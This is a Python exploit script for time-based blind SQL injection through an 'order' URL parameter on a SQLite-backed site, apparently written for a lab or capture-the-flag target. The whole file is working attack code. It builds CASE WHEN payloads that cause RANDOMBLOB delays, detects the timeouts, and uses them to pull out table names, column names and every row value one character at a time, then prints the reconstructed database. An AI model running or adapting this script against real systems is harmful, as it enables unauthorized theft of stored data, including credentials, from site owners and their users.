#!/bin/env python3
import argparse
import string
import requests


parser = argparse.ArgumentParser(description="Exploit ORDER BY SQLi")
parser.add_argument("-H", "--host", type=str, required=True, help="The host SQLi")
parser.add_argument(
    "-v",
    "--verbose",
    action="store_true",
    help="Display more information while running",
)
args = parser.parse_args()


HOST = args.host
VERBOSE = args.verbose


def make_request(payload: str) -> bool:
    query = f"(CASE WHEN {payload} THEN UPPER(HEX(RANDOMBLOB(30000000))) END)"
    url = f"http://{HOST}/?order={query}"

    try:
        requests.get(url, timeout=2)
    except requests.exceptions.ReadTimeout:
        return True

    return False


def get_num_tables() -> int:
    if VERBOSE:
        print("[*] Getting the number of tables")
    payload = "%d = (SELECT COUNT(name) FROM sqlite_master WHERE type='table')"

    index = 0
    while True:
        if make_request(payload % index):
            break

        index += 1

    print(f"[+] Found {index} tables")

    return index


def get_table_name(table: int) -> str:
    if VERBOSE:
        print(f"[*] Getting the name of table {table}")
    payload = f"'%s' = (SELECT SUBSTRING(name, %d, 1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {table})"

    lowercase = string.ascii_lowercase
    offset = 1
    name = ""
    while True:
        for letter in lowercase:
            if make_request(payload % (letter, offset)):
                name += letter
                offset += 1
                if VERBOSE:
                    print(f'[*] Found partial table name "{name}"')
                break
        else:
            break

    print(f'[+] Found table name "{name}"')

    return name


def get_num_columns(table: str) -> int:
    if VERBOSE:
        print(f"[*] Getting the number of columns for table {table}")
    payload = f"%d = (SELECT COUNT(name) FROM pragma_table_info('{table}'))"

    index = 0
    while True:
        if make_request(payload % index):
            break

        index += 1

    print(f'[+] Found {index} columns in table "{table}"')

    return index


def get_column_name(table: str, column: int) -> str:
    if VERBOSE:
        print(f"[*] Getting the name of column {column} from table {table}")
    payload = f"'%s' = (SELECT SUBSTRING(name, %d, 1) FROM pragma_table_info('{table}') LIMIT 1 OFFSET {column})"

    lowercase = string.ascii_lowercase
    offset = 1
    name = ""
    while True:
        for letter in lowercase:
            if make_request(payload % (letter, offset)):
                name += letter
                offset += 1
                if VERBOSE:
                    print(f'[*] Found partial column name "{name}"')
                break
        else:
            break

    print(f'[+] Found column "{name}" in table {table}')

    return name


def get_num_rows(table: str) -> int:
    if VERBOSE:
        print(f"[*] Getting the number of rows in table {table}")
    payload = f"%d = (SELECT COUNT(*) FROM {table})"

    index = 0
    while True:
        if make_request(payload % index):
            break

        index += 1

    print(f'[+] Found {index} rows in "{table}"')

    return index


def get_entry_value(table: str, column: str, row: int) -> str:
    if VERBOSE:
        print(f"[*] Getting the value of column {column} in table {table} at row {row}")
    payload = (
        f"'%s' = (SELECT SUBSTRING({column}, %d, 1) FROM {table} LIMIT 1 OFFSET {row})"
    )

    characters = string.printable
    offset = 1
    value = ""
    while True:
        for char in characters:
            if make_request(payload % (char, offset)):
                value += char
                offset += 1
                if VERBOSE:
                    print(f'[*] Found partial value "{value}"')
                break
        else:
            break

    print(
        f'[+] Found value "{value}" in table "{table}" for columns "{column}" at row {row} '
    )

    return value


def main():
    database = {}
    num_tables = get_num_tables()
    for table_idx in range(num_tables):
        table_name = get_table_name(table_idx)
        database[table_name] = {}
        num_columns = get_num_columns(table_name)
        num_rows = get_num_rows(table_name)
        for column_idx in range(num_columns):
            column_name = get_column_name(table_name, column_idx)
            database[table_name][column_name] = []
            for row in range(num_rows):
                entry_value = get_entry_value(table_name, column_name, row)
                database[table_name][column_name].append(entry_value)

    print(database)


if __name__ == "__main__":
    main()
